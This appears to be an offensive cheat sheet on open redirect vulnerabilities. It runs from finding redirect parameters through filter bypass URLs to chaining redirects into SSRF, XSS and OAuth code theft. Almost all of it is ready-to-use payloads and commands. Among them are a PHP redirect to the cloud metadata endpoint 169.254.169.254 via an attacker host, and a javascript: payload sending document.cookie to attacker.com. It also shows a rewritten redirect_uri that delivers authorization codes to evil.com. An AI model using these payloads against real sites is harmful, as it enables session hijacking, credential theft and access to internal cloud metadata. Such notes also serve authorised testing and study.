
## Table of Contents:

- [[#Detection & Identification]]
- [[#Basic Exploitation]]
- [[#Filter Bypass Techniques]]
- [[#Open Redirect to SSRF]]
- [[#Open Redirect to XSS]]
- [[#OAuth & Token Theft via Redirect]]

---

## Detection & Identification

Any parameter that controls where the user goes after an action

```bash
# Common parameter names
?redirect=
?url=
?next=
?return=
?returnTo=
?return_url=
?returnUrl=
?callback=
?continue=
?destination=
?dest=
?goto=
?target=
?redir=
?redirect_uri=
?redirect_url=
?out=
?view=
?to=
?link=
?location=

# Find in JS files
cat app.js | grep -iE "(redirect|return|next|callback|destination|goto)\s*[=:]"

# Find in response headers
curl -I https://target.com/login | grep -i location

# Features that commonly redirect
# - Login/logout flows
# - OAuth callbacks
# - Payment completion pages
# - Email confirmation links
# - Password reset flows
# - "Return to previous page" functionality
```

---

## Basic Exploitation

```bash
# Direct redirect test
curl -I "https://target.com/login?redirect=https://evil.com"
# Look for Location: https://evil.com in response

# Common payloads
https://target.com/login?next=https://evil.com
https://target.com/login?return=//evil.com
https://target.com/login?redirect_uri=https://evil.com

# Relative redirect
https://target.com/login?next=/dashboard  # legitimate
https://target.com/login?next=//evil.com  # redirect to evil.com

# Protocol-relative URL
https://target.com/login?redirect=//evil.com

# Confirm redirect chain
curl -L -v "https://target.com/login?redirect=https://evil.com" 2>&1 | grep Location
```

---

## Filter Bypass Techniques

```bash
# Bypass domain whitelist checks
# If filter checks for target.com in URL:
https://evil.com?target.com              # query string bypass
https://evil.com#target.com             # fragment bypass
https://target.com.evil.com/            # subdomain trick
https://evil.com/target.com             # path trick
https://target.com@evil.com/            # @ trick

# Protocol bypasses
//evil.com                              # protocol-relative
\/\/evil.com                            # backslash
/\evil.com
/%09/evil.com                           # tab character
/%0d/evil.com                           # carriage return
/%0a/evil.com                           # newline

# URL encoding bypasses
https://evil%2Ecom/                     # encoded dot
https://%65%76%69%6C%2E%63%6F%6D/     # fully encoded
https://evil%00.target.com/             # null byte

# Case bypass
https://EVIL.COM/

# Unicode/homoglyph bypass
# Replace characters with unicode lookalikes
# e.g. ℯvil.com using Unicode Latin Small Letter Script E

# Whitelist bypass with redirect chain
# If only relative URLs allowed:
/external?url=https://evil.com
# Or with open redirect on whitelisted domain:
https://trusted.com/redirect?url=https://evil.com

# Double redirect
https://target.com/redirect?url=https://target.com/redirect?url=https://evil.com

# JavaScript pseudo-protocol
javascript:window.location='https://evil.com'
```

---

## Open Redirect to SSRF

```bash
# If SSRF filter blocks direct internal URLs but follows redirects:

# 1. Host redirect on attacker server
cat > redirect.php << 'EOF'
<?php
header("Location: http://169.254.169.254/latest/meta-data/");
exit();
?>
EOF

# 2. Use open redirect to point to your redirect
curl "https://target.com/fetch?url=https://target.com/redirect?next=http://ATTACKER_IP/redirect.php"

# 3. Or chain with another open redirect on a whitelisted domain
# Find open redirect on whitelisted.com - point to 169.254.169.254
```

---

## Open Redirect to XSS

```bash
# If redirect destination is reflected in page (e.g. "You are being redirected to X")
https://target.com/redirect?url=javascript:alert(1)
https://target.com/redirect?url=data:text/html,<script>alert(1)</script>

# If URL is put in a link on the page:
https://target.com/redirect?url=javascript:alert(document.cookie)

# If app does client-side redirect via JS:
# location.href = params.get('redirect')  - XSS via javascript: URI
https://target.com/page?redirect=javascript:fetch('https://attacker.com/?c='+document.cookie)
```

---

## OAuth & Token Theft via Redirect

```bash
# If redirect_uri in OAuth flow is not strictly validated:
# Normal flow:
https://target.com/oauth/authorize?
  client_id=APP_ID&
  redirect_uri=https://target.com/callback&
  response_type=code&
  scope=email

# Attack: change redirect_uri to attacker domain
https://target.com/oauth/authorize?
  client_id=APP_ID&
  redirect_uri=https://evil.com/steal&
  response_type=code&
  scope=email

# Attacker receives:
# https://evil.com/steal?code=AUTHORIZATION_CODE
# Exchange code for token on attacker's side

# Partial match bypass: if only checking prefix:
# Allowed: https://target.com/callback
# Bypass: https://target.com.evil.com/callback
# Bypass: https://target.com/callback/../../../evil.com

# Fragment bypass: some providers copy fragment to redirect
https://target.com/oauth/authorize?
  redirect_uri=https://target.com/callback%23https://evil.com
```

---
